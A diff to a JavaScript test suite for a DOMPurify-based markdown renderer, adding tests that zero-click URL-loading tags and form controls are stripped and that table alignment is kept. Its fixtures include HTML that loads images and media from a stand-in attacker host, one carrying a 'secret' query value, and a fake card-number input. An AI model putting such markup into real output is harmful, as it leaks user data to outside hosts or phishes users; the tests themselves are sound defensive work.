@@ -97,6 +97,30 @@ describe('renderMarkdown', () => {
     expect(result).toContain('Log in');
   });
 
+  it('strips other tags that load a URL with no click, and form controls', () => {
+    const result = renderMarkdown(
+      [
+        '<video poster="https://evil.example/v.png?q=secret"></video>',
+        '<audio src="https://evil.example/a.mp3"></audio>',
+        '<video><source src="https://evil.example/s.mp4"></video>',
+        '<table background="https://evil.example/t.png"><tr><td background="https://evil.example/td.png">x</td></tr></table>',
+        '<svg><image href="https://evil.example/i.png"></image></svg>',
+        '<input type="image" src="https://evil.example/in.png">',
+        '<input placeholder="Enter your card number"><button>Pay</button>',
+      ].join('\n'),
+    );
+    expect(result).not.toContain('evil.example');
+    ['<video', '<audio', '<source', '<svg', '<input', '<button'].forEach((tag) =>
+      expect(result).not.toContain(tag),
+    );
+  });
+
+  it('keeps markdown tables with column alignment', () => {
+    const result = renderMarkdown('| a | b |\n|:--|--:|\n| 1 | 2 |');
+    expect(result).toContain('<th align="left">a</th>');
+    expect(result).toContain('<td align="right">2</td>');
+  });
+
   it('converts markdown lists to HTML', () => {
     const input = '- Item 1\n- Item 2';
     const result = renderMarkdown(input);
@@ -223,7 +247,8 @@ describe('renderMarkdown', () => {
         sanitize: (purifier, html, { config }) =>
           purifier.sanitize(html, {
             ...config,
-            FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
+            ALLOWED_TAGS: [...(config.ALLOWED_TAGS ?? []), 'form', 'input'],
+            ALLOWED_ATTR: [...(config.ALLOWED_ATTR ?? []), 'action', 'type'],
           }),
       });
       expect(result).toContain('<form action="/submit">');
@@ -266,7 +291,15 @@ describe('dompurify IN_PLACE detached-subtree sanitization', () => {
             }
           });
 
-          purifier.sanitize(wrapper, { ...config, IN_PLACE: true });
+          // The wrapper and the test's own tags sit outside the default markdown allowlist.
+          const tags = [...(config.ALLOWED_TAGS ?? []), 'div', 'span', 'section'];
+          const attrs = [...(config.ALLOWED_ATTR ?? []), 'src'];
+          purifier.sanitize(wrapper, {
+            ...config,
+            ALLOWED_TAGS: tags,
+            ALLOWED_ATTR: attrs,
+            IN_PLACE: true,
+          });
           return wrapper.innerHTML;
         },
       },
